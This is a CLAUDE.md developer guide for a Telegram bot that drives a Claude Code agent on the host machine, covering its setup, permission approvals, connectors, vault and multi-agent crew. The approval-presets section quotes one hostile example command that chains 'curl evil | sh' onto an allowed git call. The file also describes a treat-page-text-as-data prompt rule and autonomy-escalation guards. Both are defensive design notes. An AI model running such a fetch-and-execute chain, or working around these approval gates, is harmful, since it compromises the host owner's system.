# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What this is

A Telegram bot that exposes a real Claude Code agent over chat. A user messages the bot; the bot drives the Claude Agent SDK on the host machine, streams the reply back live, and gates risky tool calls behind inline approval buttons. **The bot can read/write/run anything on the host**, the only access control is the `ALLOWED_USER_IDS` allow-list enforced in `src/auth.ts`.

## Commands

```bash
npm run dev        # concurrently: tsx watch (bot) + vite build --watch (panel), both stay fresh
npm run build      # tsc -> dist/
npm start          # node dist/index.js (requires build first)
npm run typecheck  # tsc --noEmit
```

There is no test suite, linter config, or single-test runner. `typecheck` (strict mode, with `noUnusedLocals`/`noUnusedParameters`) is the only automated check, run it after changes.

Requires Node >= 20. Config comes from `.env` (copy from `.env.example`); the process exits at startup with a printed list of issues if required vars are missing (see `parseConfig` in `src/config.ts`).

### Deployment scripts (`scripts/`)

`myagens-install.sh` is the self-contained `curl | bash` wizard (installs prerequisites, clones, builds, configures `.env`, optionally installs the service); it does **not** assume a checkout and reads prompts from `/dev/tty` so it stays interactive when piped. With `--browser` (or `MYAGENS_SETUP=browser`) it instead asks nothing after the prereqs+clone+build: it boots the app in **setup mode** (see below), which serves the browser wizard; on wizard completion (`MYAGENS_SETUP_HANDOFF=exit` makes the process exit 0 once `.env` is written) the script installs+starts the service with `MYAGENS_SKIP_BUILD=1` (honoured by both `install-service.sh` impls) so the wizard's success page — which polls the panel port — signs the user in within seconds. On Linux it takes `sudo -v` *before* handing off to the browser and keeps the timestamp warm, so the service install never prompts behind the user's back. The CLI (non-browser) wizard verifies the bot token live against `getMe` and offers press-START owner-id detection via `getUpdates` (raw curl, manual entry as fallback) so both paths validate the same values. The rest operate on an existing checkout: `run.sh` (launcher, also the service `ExecStart`), `update.sh` (pull + build + restart-if-service), `install-service.sh` / `uninstall-service.sh` / `agentctl.sh` (all OS-dispatchers to `linux/` = systemd, `macos/` = launchd). Keep the dispatchers thin and put platform specifics in the `linux/`/`macos/` impls. The hosted `https://myagens.com/install.sh` 301-redirects to the raw GitHub file, **bump both together** when changing the installer (the legacy `https://gyorgy.sh/myagens-install.sh` short URL still redirects too). **Windows** has its own PowerShell parallel under `scripts/windows/` (`myagens-install.ps1` wizard, `myagens-run.ps1` launcher, `update.ps1`, `uninstall.ps1`), hosted as `https://myagens.com/install.ps1`; it uses `winget` for Node/Git and an NSSM service with a Task Scheduler fallback. It has the same browser setup mode (`MYAGENS_SETUP=browser`): prereqs+clone+build, then the Windows service password is collected *before* the wizard handoff (mirroring the Linux `sudo -v` trick) and the NSSM install runs on wizard exit 0. Bump the hosted PS1 alongside the repo copy too.

## Architecture

ESM throughout (`"type": "module"`), so **relative imports must use the `.js` extension** even though sources are `.ts`.

**Entry point / first-run setup mode** (`src/index.ts` → `src/setup/`): `index.ts` is a thin launcher — when `TELEGRAM_BOT_TOKEN`/`ALLOWED_USER_IDS` are missing (or still the `.env.example` placeholder) it dynamic-imports `src/setup/server.ts` instead of the real app (`src/app.ts`, the old index body). The branch must stay a *dynamic* import: `config.ts` `process.exit(1)`s at module load on invalid config. Setup mode is a loopback-only, single-use Fastify wizard: random per-boot key in the printed/auto-opened URL (`?k=…`, checked constant-time on every `/setup/api` call), Host-header loopback allow-list (DNS rebinding), 410 on all APIs once finished. Steps validate before saving: `getMe` proves the bot token; the owner id is auto-detected by long-polling `getUpdates` for whoever DMs the bot (`src/setup/telegram.ts`) and proven by a confirmation DM; Claude auth is detected (`claude auth status`), driven (`claude setup-token` under node-pty with pipe fallback, `src/setup/claude.ts`), or an API key validated against `/v1/models`. `finish` writes `.env` 0600 (`src/setup/env.ts`), then either exits 0 (installer handoff, `MYAGENS_SETUP_HANDOFF=exit`) or respawns itself detached; the success page polls `/api/me` with the fresh panel token and redirects to the existing `/?token=` one-click login. The wizard UI is one self-contained HTML string (`src/setup/wizardHtml.ts`) — no build step, CSP allows nothing off-origin. `MYAGENS_SETUP=off` restores fail-fast config errors (CI). The setup server deliberately imports nothing that imports `config.ts` (logger.ts is dependency-free and safe).

Every turn opens with a "💭 Working on it…" ack message (`handleUserPrompt`): in `edit` mode it *is* the streamed reply; in `rich`/`draft` modes it's a placeholder deleted in `finally`. Streamed text is run through `normalizeAgentText` (`formatting.ts`) — Claude Code's TUI pads with non-ASCII spaces that render badly in Telegram, so they're folded to normal spaces.

Request lifecycle for one user message (`handleUserPrompt` in `src/bot.ts`):
1. `auth.ts` middleware drops anyone not in `allowedUserIds`.
2. A per-chat `Session` (`src/session/manager.ts`) holds `sessionId` (Claude resume token), `cwd`, `busy` flag, `abort` controller, `mode`, the per-session "always allow" tool set, and `usage` counters. Durable fields are persisted to `STATE_FILE` (`data/state.json`) via `src/session/store.ts`, loaded on boot, written debounced, and flushed on shutdown.
3. A placeholder message is sent, wrapped in a `TelegramStreamer`.
4. `getBackend(backendId).runTurn(...)` (`src/core/backends.ts`) dispatches to the selected `AgentBackend` — by default `src/claude/runner.ts`, which calls the SDK `query()` and iterates its async message stream, fanning events to callbacks: `onText`, `onToolUse`, `onSessionId`, and the final `result`.
5. Streamer edits the message in place (throttled) and the loop ends; `busy`/`abort` are cleared in `finally`.

Key cross-cutting pieces:
- **Per-chat turn rate limiter** (`src/core/rateLimiter.ts`): `TokenBucketLimiter` checked before each turn; default 5 tokens per 60s window. Autonomous turns bypass it. `TURN_RATE_LIMIT=0` disables.
- **Permission flow** (`src/telegram/permissions.ts` + `canUseTool` in `bot.ts`): read-only tools in `AUTO_ALLOWED_TOOLS` run automatically; others post Approve/Deny/Always-allow buttons. "Always" persists to `session.sessionAllowedTools`. **Approval coalescing**: simultaneous tool_use blocks are buffered for 300ms (capped at 1.2s) and rendered as one grouped message with per-tool buttons and a bulk Allow-all/Deny-all row; each still resolves its own promise.
- **Modes**: `safe` → SDK `permissionMode: "default"`; `auto` → `"bypassPermissions"`. Set via `/mode`.
- **Streaming** — three backends behind `STREAM_MODE`, all implementing `Streamer` (`appendText`/`setStatus`/`finalize`):
  - `rich` (default): Bot API 10.1 Rich Messages via `richDraftStreamer.ts`.
  - `draft`: Bot API 9.3 `sendMessageDraft`, finalized as formatted `sendMessage` (`draftStreamer.ts`).
  - `edit`: legacy throttled `editMessageText` (`streamer.ts`).
  - Draft backends share `baseDraftStreamer.ts` (20s keepalive, stable `draft_id`). Final send in `send.ts` (markdown→HTML, 4096 split, plain-text fallback). Bot API 9.3/10.1 called raw via `tg.callApi()` — no Telegraf 4.16.3 wrapper exists.
- **Memory** (`src/core/memory.ts` + `src/mcp/memory.ts`): durable fact store in `memory.json`. Three tiers: `hot` (injected every turn), `warm` (recalled by relevance), `cold` (dormant). MCP tools `memory_write`/`memory_search`/`memory_list` are in `AUTO_ALLOWED_TOOLS` and registered in every `runTurn` site. Each turn calls `memory.recallForPromptAsync()` and folds matches into the system prompt. `finishRecall` only bumps `useCount`/`lastUsedAt` for genuine relevance hits — not hot entries that auto-inject every turn — so idle hot entries can decay; that persist is debounced (5s) since it fires on nearly every turn and would otherwise rewrite the whole store (every embedding vector included) each time — explicit mutations (create/update/remove/embed) still persist immediately. Entries should be one terse sentence (~150 chars); default `warm`, reserve `hot` for always-relevant facts. **Maintenance** (`maintenance.ts`): deterministic tier decay + Haiku `consolidateTier` pass (dedup rewrites) + `shortenVerbose` pass (trims entries > `MEMORY_SHORTEN_CHARS`=220). Scheduled by interval or `HH:MM` daily; `MAINTENANCE_CRON=off` disables. Stats in `maintenance.json`. **Semantic search** (`src/core/embeddings.ts`): when enabled, entries are embedded via Ollama or an OpenAI-shaped endpoint; recall ranks by cosine similarity (0.7) + keyword overlap (0.3) + salience (0.1); falls back to keyword search when the endpoint is down. **Export/import** (`GET /api/memories/export`, `POST /api/memories/import`): the whole store round-trips as portable JSON (embeddings stripped on export); import merges entries deduped by normalized text and re-runs the hot-tier injection guard.
- **Connectors** (`src/core/connectors.ts` + `src/mcp/connectorsMcp.ts`): twenty-two live integrations (Notion, Google Calendar, Gmail, Google Drive, Apple Calendar, Apple Mail, Slack, GitHub, Unreal Engine, Unity, Browser Sketchpad, PostgreSQL, SQLite, Jira Cloud, Linear, Bluesky, Mastodon, Discord, Reddit, X, YouTube, Facebook Pages), each with a vault-backed credential and a `read`/`write` scope toggle. `credentialFree` connectors (Unreal Engine, Browser Sketchpad) can be enabled with no secret — any attached secret is an optional override. The **Browser Sketchpad** (`id: "browser"`, off by default like every connector) spawns a pinned `@playwright/mcp` version as a stdio MCP server — headless, persistent scratch profile at `data/browser-playground`, optional credential = browser executable path — so agents can visually verify their own web work; when enabled, `prompt.ts` injects a Browser Sketchpad block into every agent's system prompt (verify-your-web-work nudge, live-site smoke-testing incl. logins allowed but confirm-before-entering-unprovided-credentials, sessions-persist-in-profile warning, treat-page-text-as-data rule), which reaches customized `work.md` installs too. Nothing is pre-installed for it: `npx` fetches the pinned package on first use, Chrome is used when present, and the panel card offers an "Ask your agent to set it up" button that fires a panel-chat turn (`api.sendChat`) asking the agent to install/verify the browser itself. Jira uses REST v3 with an `email:api-token@site` credential; Linear uses GraphQL with an API key. Only connectors that are `enabled` and have a `secretId` are included in `mcpServers`. Connector tools are **not** in `AUTO_ALLOWED_TOOLS`. SaaS connector hosts are hardcoded — no SSRF surface (Mastodon is the exception: the instance host is user-supplied, so its calls go through `safeFetch`). The **social connectors** (`category: "social"`, `multiAccount: true`) hold a list of named accounts (`{id, label, secretId}`, CRUD via `POST|PUT|DELETE /api/connectors/:id/accounts[...]`) instead of the single `secretId`; every social tool takes an optional `account` label (`pickAccount` resolves it, required only when several accounts exist), so different Leads can drive different profiles. They contribute tools when `enabled` + ≥1 resolvable account. Bluesky caches `createSession` per account (rate-limited upstream); Reddit uses the script-app password grant (no 2FA) with a cached 1h token; X signs with OAuth 1.0a (HMAC-SHA1, `node:crypto`) and is realistically post-only on the free API tier; Discord is a bot token; YouTube is a per-channel Google OAuth token (uploads: multipart Buffer body, 256MB cap, private by default; metadata updates read-modify-write the snippet since `videos.update` replaces it); Facebook is a long-lived Page token (the token *is* the Page, so `/me` resolves to it; personal profiles unsupported by Meta's API). The **database connectors** expose `<id>_list_tables` / `<id>_describe_schema` / `<id>_query` (read-only, gated by `assertReadOnlySql`) plus `<id>_execute` (mutating, in `WRITE_TOOLS`); PostgreSQL uses a one-shot `pg` client (optional dep, lazily loaded) from a connection-string credential, SQLite uses Node's built-in `node:sqlite` opened read-only for reads and a file-path credential. `assertReadOnlySql` only checks the leading keyword, which a data-modifying CTE or `SELECT … INTO` can slip past — Postgres read-tool calls additionally run inside a `BEGIN TRANSACTION READ ONLY` so the database itself rejects any write the keyword check missed. Connectors also carry an optional `expiresAt` (epoch-ms); a derived `tokenStatus` (`none`/`ok`/`expiring`/`expired`, warn window before expiry) is returned by `GET /api/connectors` and shown as a panel badge. Agent-supplied strings that get composed into an outbound protocol payload are sanitized at the boundary: Gmail To/Cc/Bcc/Subject strip CR/LF (header injection), Apple Calendar's iCal builder escapes VEVENT text fields (property injection), and Google Drive's multipart upload uses a random per-request boundary so file content can't corrupt the body or override the metadata part.
- **Skill factory** (`src/mcp/skills.ts`): `skill_save`/`skill_patch`/`skill_list` (auto-allowed) let the agent distil reusable procedures. Post-turn extraction (`src/core/autoSkill.ts`) is the alternative, behind `AUTO_SKILL_GENERATION=true`. Skills round-trip as portable `myagens.skill` JSON bundles via `GET /api/skills/:id/export` and `POST /api/skills/import` (untrusted-bundle validation, name-collision de-dup with an " (imported)" suffix).
- **Image generation** (`src/mcp/imageGenMcp.ts` + `src/core/imageGen.ts`, `src/core/gallery.ts`): text-to-image connectors for Replicate, fal.ai, or a local Automatic1111 endpoint, surfaced as an `imageGen` MCP tool wired into delegated task runs and Lead bots. Results persist to a gallery (panel Gallery view). Provider hosts are validated the same way as other outbound calls.
- **Audit log + anomaly detection** (`src/core/audit.ts` + `src/core/anomaly.ts`): day-sharded files under `data/audit/YYYY-MM-DD.jsonl` (mirroring `logs/` and `data/runs/`) with a 90-day retention window — a one-time startup migration folds any legacy flat `audit.jsonl` into shards by each event's own timestamp. Searchable via `GET /api/audit/search` / `/api/audit/facets` (filter by actor/resource/action, NDJSON export; a `since` filter skips whole shards older than it), surfaced as an "Audit" tab in the panel Logs view. `detectAnomalies()` runs three deterministic rules (delete bursts, off-hours vault access, new privileged grants) as an `anomaly` heartbeat signal that alerts through the Telegram/push path.
- **Prompt templates** (`src/core/templates.ts`, `templates.json`): reusable prompts with `{{variable}}` slots. CRUD via `GET|POST /api/templates`, `PUT|DELETE /api/templates/:id`; surfaced as a quick-pick in the panel chat composer and via the Telegram `/templates` command.
- **Telegram inline search** (`src/telegram/inlineSearch.ts`): typing `@bot query` in any chat searches the sender's own tasks/skills/memories via the shared hybrid `semanticSearch`, gated on the allow-list directly since inline queries carry no chat id for the normal middleware.
- **Kanban delegation** (`src/core/taskRunner.ts` + `src/mcp/tasks.ts`): cards (`priority`, `parentId`, WIP limits, `delegate` state) can be delegated to an autonomous `bypassPermissions` run. Agent manages the board via `task_create`/`list`/`update` (auto-allowed); subtask creation triggers auto-archive of the parent. Retry (`POST /api/tasks/:id/retry`) resets to backlog and re-delegates; offered as inline button on Telegram failure messages. **Recurring templates**: a card with a `recurrence` rule (`daily`/`weekly`/`monthly` + time, validated by `normalizeRecurrence`) is a template that stays put and spawns a fresh backlog copy on its cadence; a 60s `startRecurrenceTicker` runs `runDueRecurrences` panel-independently, and `onRecurrenceFire` lets the panel live-refresh the board (copies don't carry the rule).
- **Full per-run transcripts** (`src/core/runLog.ts`): every autonomous run's complete output mirrored to `data/runs/YYYY-MM-DD/<runId>.ndjson` (5000-event cap, 72h retention). `findRunFile` rejects non-`[\w-]+` ids to block path traversal. Route `GET /api/runs/:runId/log`.
- **Secret vault** (`src/core/vault.ts`): AES-256-GCM encrypted secrets in `vault.json`. Master key in macOS Keychain (`cct-vault`) or a `0600` `vault.key` file on Linux. Secrets stored as `vault:<id>` references (64-bit-entropy ids), resolved at use-time via `resolveSecret()`. Key rotation and passphrase-encrypted backup/restore supported (`rotateKey()`, `exportBackup()`, `importBackup()`); `rotateKey()` is crash-atomic via a write-ahead journal so a mid-rotation death can be recovered without leaving secrets half-re-encrypted. API never returns plaintext — `toProviderView()` returns `hasToken`+`tokenHint` only.
- **Heartbeat** (`src/core/heartbeat.ts`): off by default. `alert` mode checks CPU/mem/swap/disk + stalled kanban cards (3h per-signal cooldown); `active` mode runs an autonomous agent turn on signals. Per-signal muting via `mutedSignals`. Config in `heartbeat.json`.
- **Status** (`src/core/status.ts`): public Claude service status + per-provider probes + local LM Studio/Ollama detection. `/api/status`, polled every 15s by the panel.
- **MCP send_file** (`src/mcp/sendFile.ts`): `send_file` tool (auto-allowed) pushes files back to the Telegram chat.
- **Incoming files** (`src/telegram/files.ts`): uploaded docs downloaded to session `cwd`; images also passed as inline vision content blocks (`imagePrompt` in `runner.ts`).
- **Git review flow** (`src/git.ts` + `src/telegram/gitFlow.ts`): `/diff` with Commit/Discard buttons; `/commit <msg>` stages and commits. All git calls via `execFile` (no shell); failures return `{ ok: false }`. Review buttons carry a random review id bound at render time to the repo the diff was shown for (in-memory, 1h TTL), so tapping a stale button after a `/cd` or restart acts on that captured repo (or reports `git_review_expired`) instead of silently committing/discarding whatever the session's current cwd happens to be.
- **Usage tracking**: token counts (input/output/cache-read/cache-write) folded into per-session lifetime + per-day buckets; `/usage` reports these. Panel chart at `/api/usage`.
- **Approval presets** (`src/telegram/permissions.ts`): "Always allow" persists across restarts. Bash gets a per-program "always allow `<cmd>`" button stored in `session.allowedBashCmds`; the match refuses commands containing shell metacharacters or newlines (falling through to a normal prompt instead), since matching only the first token would otherwise let a grant like "always allow `git`" auto-approve `git status; curl evil | sh`. `/allow`/`/allowed`/`/disallow` manage these (`/disallow` removes from both the tool and bash-cmd allow-lists).
- **Projects** (`src/telegram/projects.ts`): saved cwds in `session.projects`. `/projects` posts an inline menu keyed on a content hash of each path rather than its array index, so a press still targets the right directory even if the list changed since the menu was rendered.
- **Voice** (`src/core/voiceSettings.ts` + `src/telegram/voice.ts`/`tts.ts`/`vosk.ts`): engine choice (`openai`/`vosk`/`xai` for STT, `openai`/`piper`/`xai` for TTS) and credentials are configurable from the panel (Settings → Voice, `GET|PUT /api/voice`), each field falling back to the matching `.env` var (`TRANSCRIBE_PROVIDER`, `TTS_PROVIDER`, `OPENAI_API_KEY`, `XAI_API_KEY`, `VOSK_MODEL_PATH`, `PIPER_PATH`/`PIPER_MODEL`) when unset — `resolveVoiceSettings()` is the single place every voice code path reads from. `openai` = OpenAI-compatible `/audio/transcriptions` (Groq etc. via a custom base URL); `vosk` = fully local (ffmpeg → 16kHz PCM → Vosk model, optional dep); `xai` = xAI's `/v1/stt`, raw OGG/Opus bytes since it's one of xAI's auto-detected container formats. Transcript echoed and run as a normal turn. TTS mirrors this. Credentials for the `openai`/`xai` engines can be linked to a `purpose: "voice"` `Provider` (vault-backed key, panel CRUD) instead of `.env`, letting a free-tier OpenAI-compatible STT key and an xAI TTS key coexist. Both `xai` and `openai` request WAV output rather than Opus directly (xAI's `/v1/tts` has no Opus/OGG codec; not every OpenAI-compatible provider — e.g. Groq — supports `response_format: "opus"` either), so when `sendVoiceNotes` is on (default), the WAV is transcoded to Opus via ffmpeg (`transcodeToOgg` in `tts.ts`, same dependency Vosk already uses one-way) so it still sends as a true `sendVoice` note, falling back to `sendAudio` if ffmpeg is unavailable — same fallback path Piper always used. `sendVoiceReply()` never throws: on synthesis/delivery failure it logs, sends a short chat notice explaining why (a dedicated hint for provider terms-acceptance gates and Telegram's `VOICE_MESSAGES_FORBIDDEN` privacy block, a generic one otherwise), and returns `false` so the caller knows the voice reply didn't go out. Voice-out mirrors voice-in: a spoken reply is only added when the triggering turn's own prompt was a voice message and `session.voiceReply` is on — a typed message always gets a typed answer even with `/voice on`, and the text reply is always sent regardless (voice is additive, never a replacement).
- **Scheduling** (`src/schedule/`): `ScheduleManager` (persisted to `schedules.json`, 30s tick, reentrancy-guarded so a slow tick can't overlap the next). Due jobs run as autonomous `bypassPermissions` turns in the captured cwd; skipped if busy. `parseWhen` accepts `30m/2h/1d` or `HH:MM`.
- **Management panel** (`src/panel/server.ts` + `panel/`): optional embedded Fastify SPA, enabled by `PANEL_ENABLED=true`. Requires `PANEL_TOKEN` (16-char minimum; auto-healed and DM'd to users if missing/short via `healPanelToken()`). Bearer token auth on all `/api`+`/ws` routes; `?token=` accepted only for the `/ws` handshake. Per-IP lockout after 10 failures (5 min) — Fastify's `trustProxy` only trusts `X-Forwarded-For` from a loopback direct peer (the only address a legitimate tunnel/reverse-proxy can connect from, since the panel always binds loopback), so the lockout sees the real client IP for tunneled traffic instead of always resolving to 127.0.0.1 (which would silently exempt every such request from it). Mutating routes are rate-limited by `PANEL_RATE_LIMIT`; a separate, deliberately high `PANEL_READ_RATE_LIMIT` (default 600/window) caps a few expensive GETs (`/api/memories`, `/api/logs`, `/api/runs`) so a runaway client can't flood them without throttling normal fleet reads. The global Fastify `bodyLimit` is 1MB (raised per-route only on the store-import endpoints that need it) so the public, unauthenticated `POST /hook/:id` can't force huge body buffering + HMAC work; that route also carries its own per-IP rate limit (30/min). CSP `connect-src` is pinned to `'self'` (not the bare `ws:`/`wss:` schemes, which match any host and would let injected script exfiltrate the panel token over an attacker-controlled WebSocket) — same-origin still covers the panel's own socket. CSRF defence: Bearer header is inherently CSRF-safe; `isCsrfRisk()` additionally rejects cross-origin non-GET requests with no `Authorization` header. Data dir is `chmod 0700`; stores parse with `safeReviver` (drops `__proto__`/`constructor`/`prototype`). Panel chat (`src/core/chat.ts`) is a persistent session streamed over `/ws`; autonomy level is controlled via the in-panel selector (calls `PUT /api/agent`). Full REST surface is in `PANEL_API.md`. Frontend is React+Vite+Tailwind v4 in `panel/`, built to `panel/dist`. Graceful shutdown: SIGTERM → 30s for in-flight turns → 10s flush → exit (~43s worst-case; `launchd ExitTimeOut=85`, `systemd TimeoutStopSec=85`).
- **Main agent settings** (`src/core/mainSettings.ts`, `mainAgent.json`): optional `model`+`providerId`+`backendId` applied per-turn by `resolveMainRun()`. `/model` sets from a shortcut grid or by name; also accepts a hidden `/model <backendId>` or `/model <backendId>:<model>` syntax to switch agent backend (see **Agent backends** below) — picking a Claude shortcut button resets `backendId` back to Claude so a stale non-Claude model id can't linger. `normalizeModelId()` (`src/config.ts`) silently upgrades retired model ids (`claude-sonnet-4-5`, `claude-sonnet-4-6`) to `claude-sonnet-5` before every run, so a stale `.env`/`mainAgent.json` value never needs a manual edit. Panel `/api/agent` GET/PUT/reset/restart. **Model fallback** (`fallbackProviderId`/`fallbackBackendId`/`fallbackModel`/`fallbackThreshold`): two triggers onto one target. `resolveMainRunFor({autonomous})` swaps to the fallback *proactively* for background turns once the cached usage probe crosses the threshold (driving the `degraded` banner); `runTurnWithFallback()` (`src/core/fallback.ts`, gated by `isUsageLimitError`) fails a single turn over *reactively* when it hits a usage/rate-limit error mid-flight (interactive turns included, wired into `bot.ts`/`leadBot.ts`/`agentChat.ts`). The fallback can now switch the whole agent backend (`fallbackBackendId` = Grok/Codex/Ollama), not just repoint the Claude backend at another endpoint (a fallback provider only applies when the fallback backend is Claude); a cross-backend failover drops the resume token so it starts a fresh conversation. Workers/Leads carry their own `fallbackBackendId`/`fallbackProviderId`/`fallbackModel` (resolved via `workerFallbackSpec()`), so each fails over independently of the global main-agent fallback. **Known paths** (`knownPaths`): array of `{ label, path }` pairs injected into the system prompt each turn so agents know key folder locations without the user repeating them; also surfaced as quick-pick chips in the Workers panel when setting a worker `cwd`. **Providers** (`src/core/providers.ts`): named model-endpoint presets, tagged by `purpose` (`"chat"`, the default — a worker with a `providerId` runs with `ANTHROPIC_BASE_URL`/`ANTHROPIC_AUTH_TOKEN` set, Claude backend only; or `"voice"` — an xAI/OpenAI-compatible key consumed by Settings → Voice, see the **Voice** bullet below). `GET /api/providers` defaults to `purpose=chat` so the two lists never mix in the panel's pickers. User-supplied URLs are validated by `assertSafeUrl()` + DNS-pinning `safeFetch()` (`src/core/safeUrl.ts`) — blocks link-local/metadata IPs, allows loopback+LAN. **Logs** (`src/logger.ts`): NDJSON to `logs/YYYY-MM-DD.log` (72h retention), in-memory ring buffer (1000 entries), central secret redactor in `emit()` (Bearer tokens, `sk-`/`sk-ant-` prefixes, sensitive key=value pairs). Cross-file search via `searchAllLogs()`; usage analytics via `summarizeUsage()`. Panel Logs view has Activity feed, Raw logs, and Analytics tabs.
- **Agent backends** (`src/core/backends.ts`): an `AgentBackend` registry (`{id, displayName, runTurn}`) every real call site goes through via `getBackend(backendId)` rather than importing a runner's `runTurn` directly — `getBackend()` with no id always falls back to `claude-agent-sdk`. Three more are registered: `grok-cli` (`src/grok/runner.ts`, spawns xAI's `grok` CLI, parses its `--output-format streaming-json` events — `thought`/`text`/`end` — no tool-call visibility or usage/cost data in that output), `codex-cli` (`src/codex/runner.ts`, spawns OpenAI's `codex exec`/`codex exec resume`, parsing `thread.started`/`item.started`/`item.completed`/`turn.completed` — this one *does* expose tool-call events and real token usage), and `ollama` (`src/ollama/runner.ts`). The grok/codex backends wrap the provider's own agentic CLI (tool belt, sandboxing, permission modes) rather than reimplementing a tool-loop; neither reads the `providers.ts` env-override mechanism (each CLI manages its own auth). **Ollama is different**: it is plain chat against a local Ollama server's `/api/chat`, not a CLI wrapper, so a small local model (14-24B) which could never prefill the Claude CLI's ~30k-token system prompt stays fast and fully Anthropic-independent. It hand-builds a tiny (<2k-token) system prompt instead of importing the `claude_code` preset from `prompt.ts` (folding in `workerIdentity`/`persona`/`systemPromptAppend`/`language` plus a runtime block that disowns the crew/MCP tools those texts mention), reimplements a minimal tool loop offering exactly one `Bash` tool gated through the same `canUseTool` path (up to 8 rounds, last round tool-less; models with no function calling auto-degrade to plain chat), and persists per-session history as JSON under `data/ollama-sessions/<id>.json` (Ollama has no server-side sessions), replaying a windowed slice each turn. It reads `OLLAMA_BASE_URL`/`OLLAMA_MODEL`/`OLLAMA_NUM_CTX` (num_ctx clamped so a custom 32k Modelfile can't swap-thrash the host)/`OLLAMA_KEEP_ALIVE` from env, ignoring `opts.env` so a configured cloud chat provider can't silently redirect it off-host. `backendId` lives alongside `providerId` on `MainSettings` and `Worker` (so one Lead/worker can run on a different backend while everyone else stays on Claude), deliberately not persisted/exposed until a second backend existed to select. Switching an agent's `backendId` resets its stored `sessionId`, since a Claude resume-token UUID means nothing to grok/codex and would otherwise fail to resume every turn. The panel surfaces it as a small selector next to Provider/Model in Settings and the Worker form — picking a grok/codex backend clears and hides Model/Provider (replaced with a hint) since neither applies, preventing an invalid pairing like `backendId=codex-cli` + a stale Claude model id. Ollama is the exception: the Model field stays visible (it's the free-text local model name) while Provider is still hidden.
- **System prompt / personality** (`src/prompt.ts`): each turn uses `{ type: "preset", preset: "claude_code", append }`, appending a fixed personality + contents of `work.md` (re-read each turn; path overridable via `WORK_FILE`). When `work.md` or `CLAUDE.md` in the session `cwd` exceeds a size threshold, the panel displays a warning banner and offers trimming — oversized playbooks bloat input tokens on every turn. **Per-agent prompt slimming** (`promptExclude` on `MainSettings` and each `Worker`; keys `"workMd" | "persona" | "knownPaths" | "memory"`, sanitized by `sanitizePromptExclude` in `prompt.ts`): a per-agent opt-out that drops those sections from *our* append (`"memory"` skips recall entirely and `"persona"` is zeroed in `runner.ts`; `"workMd"`/`"knownPaths"` are honoured by `systemPrompt()`). It trims only the append, never the Claude Code preset itself, so the main win is for smaller/local models where a big `work.md` costs input tokens every turn. Surfaced as a four-checkbox "System prompt" row in the panel agent Settings and Worker form; the ollama backend honours `"persona"` too but already ignores the rest.

`src/claude/events.ts` holds type guards over the SDK's loosely-typed message union; add/use guards there over inline `any` casts.

The SDK is configured with `settingSources: ["user", "project", "local"]` so the driven agent loads real CLAUDE.md / settings from whatever `cwd` it runs in — genuine Claude Code session behaviour, not a sandbox.

## Fleet build subsystems

The sections above describe the original single-bot core. Features below follow the same conventions: telegraf-free logic in `src/core/`, in-process MCP server per capability, panel view + REST routes per feature, JSON persistence in the data dir.

- **Crew hierarchy** (`src/core/workers.ts`, `src/telegram/leadBot.ts`, `src/mcp/crew.ts`): `WorkerManager` singleton (`workers`) runs named autonomous agents. Workers with `role:"lead"` + `telegramToken` (a `vault:<id>` ref) get their own slim Telegraf instance. Auth requires an allow-listed sender **and** a private 1:1 chat (id == sender id) — a Lead bot added to a group can't leak host output. Lead bots start/stop live on worker create/enable/disable; no restart needed. A Lead's Telegraf `launch()` can die on its own (e.g. a 409 Conflict from a second poller on the same token) without the registry changing, so `LeadBotManager` runs a 60s watchdog that treats a dead entry (`!isRunning()`) like a missing one and revives it (deferring one tick if a turn is still in flight, via `hasActiveTurn()`); `POST /api/workers/:id/restart-bot` forces one immediately. `sync()` calls are serialized through an internal queue (never run concurrently) since boot, `workers.onChange`, and the watchdog can all trigger it around the same time — without that, two overlapping calls for the same not-yet-tracked Lead could both spawn a poller, doubling up. Lead message handlers dispatch turns **fire-and-forget** so a running turn never blocks the poll loop, and share Atlas's busy/loop-detection/`friendlyError` handling. `/ping` (also on Atlas) reports online + idle/busy + current task + uptime; `/team` (Atlas) lists each Lead's live connection and busy state. Each Lead bot owns a `SessionManager("lead-<id>-state.json")` (resolved next to `STATE_FILE` in `data/`), so its `sessionId` resume token is persisted via `onSessionId`→`sessions.save()` and survives restarts/updates (the gitignored `data/` dir is untouched by `update.sh`). `crewMcp` tools: `crew_delegate` (subtask to a Lead — bound by the same task-run timeout, loop detector, and output cap as a normal delegated run, rather than unbounded; the child run's autonomy is capped at the caller's own, so only `full`/`auto_until_error` callers can grant `bypassPermissions` downstream and a lower-privilege caller can't escalate through the delegation chain — from a `standard`/`supervised` caller it instead files the delegation to the suggestion inbox for explicit approval), `crew_report` (log + optional notify), `crew_ask_president` (block turn until user replies — resolved via `hasPendingAsk`/`resolveAsk` **before** the busy guard; the pending-ask registry (`src/core/crewAsk.ts`) is keyed by `(chatId, agentId)`, not chatId alone, since a private chat has the same numeric id across every bot token — Atlas and every Lead would otherwise share one key space and a reply could resolve the wrong agent's question), `crew_suggest` (non-urgent proposal → suggestion inbox). A Lead's `canUseTool` now honours its own autonomy the same way `WorkerManager` runs do: below `full` it runs in SDK `default` permission mode gated to `AUTO_ALLOWED_TOOLS`, instead of always running with every tool auto-approved — a Lead must be set to `full` to run Bash/Write/Edit. `AskUserQuestion` SDK calls render as inline buttons (`AskQuestionManager`, `src/telegram/askQuestion.ts`). Lead bots accept photos and documents mirroring the main bot pipeline. Lead/worker runs pass a `workerIdentity` string (`RunOptions.workerIdentity` in `runner.ts`, threaded through `systemPrompt()` in `prompt.ts`) that replaces the opening Atlas personality block, so Leads identify as themselves in panel chat and autonomous runs, not as Atlas.
- **Council votes** (`src/core/council.ts`): `/council <proposal>` runs every enabled Lead + Atlas as a one-shot SUPPORT/OPPOSE vote in SDK `default` permission mode (not `bypassPermissions`) so the read-only `canUseTool` gate actually applies rather than being a no-op. Quorum requires at least one enabled Lead. Votes are **relevance-weighted** — each voter's weight is the proposal's relevance to their domain (1.0 when embeddings are off, so everyone counts equally). The decision **rule** is configurable in `councilRule.json` via `GET|PUT /api/council/rule`: `majority` (default), `supermajority` (≥2/3 of decisive weight), or `unanimous`. Results in `GET /api/council`.
- **Suggestion inbox** (`src/core/suggestions.ts` + `src/telegram/inboxFlow.ts`): `crew_suggest` queues entries in `suggestions.json`. `/inbox` renders the queue with Park (→ backlog task), Delegate (→ task + Lead run), or Dismiss buttons.
